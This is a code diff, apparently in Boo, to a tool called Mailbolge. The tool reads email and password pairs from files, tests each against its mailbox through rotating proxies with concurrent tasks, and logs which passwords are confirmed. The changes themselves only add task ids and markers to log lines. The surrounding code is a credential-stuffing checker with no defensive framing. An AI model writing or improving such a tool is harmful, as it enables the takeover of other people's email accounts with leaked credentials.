@@ -165,18 +165,19 @@ class Mailbolge:
 		dbg	= {info|ui.dbg(info); return self}
 		reporter = storage
 
-	def checker(box as Box, dest as duck):
+	def checker(box as Box, idx as int, dest as duck):
+		id = "[$(idx.ToString('X'))]"
 		return def():
 			# Initial setup.
 			hardlimit.Wait()
 			# Actual check-up.
-			if box.proxy = proxlist.get_next():	log("Launching check through •$(box.proxy)• for •$(box)•", 'note')
-			else: log("Launching check for •$(box)•", 'note')
+			if box.proxy = proxlist.get_next():	log("$id Launching check through •$(box.proxy)• for •$(box)•", 'note')
+			else: log("$id Launching check for •$(box)•", 'note')
 			if result = box.probe() == "fail":
-				log("Unable to access •$(box.email)• with password •$(box.password)•", 'fail')
+				log("$id Unable to access •$(box.email)• with password •$(box.password)•", 'fail')
 				dest.echo(box, 'fail')
 			else:
-				log("Password for •$(box.email)• confirmed: •$(box.password)•", 'success')
+				log("$id Password for •$(box.email)• confirmed: •$(box.password)•", 'success')
 				dest.echo(box, "success")
 			# Finalization.
 			hardlimit.Release()
@@ -246,17 +247,17 @@ class Mailbolge:
 			tasks		= List[of Task]()
 			# Parsing phase.
 			try:
-				log("Parsing '•$(value)•'...", 'io')
+				log("/Parsing '•$(value)•'...", 'io')
 				dest	= reporter(value)
 				for entry in File.ReadLines(value):
 					if box = entry.to_box():
-						tasks.Add(Task.WhenAny(Task.Run(checker(box, dest)), Task.Delay(20000)))
+						tasks.Add(Task.WhenAny(Task.Run(checker(box, tasks.Count, dest)), Task.Delay(20000)))
 					else: log("Invalid entry encountered: •$(entry)•", 'fault')
 			except ex: log(ex, 'fault')
 			# Wait phase.
 			using {dbg("::$(Math.Round(progress*100.0/tasks.Count, 1))%")}.reminder():
 				Task.WaitAll(tasks.ToArray(), -1)
-				log("•$((progress.account() if progress else 'No'))• email adresses was tested.\n", 'io')
+				log("\\•$((progress.account() if progress else 'No'))• email adresses was tested.\n", 'io')
 #.}
 
 # ==Main code==
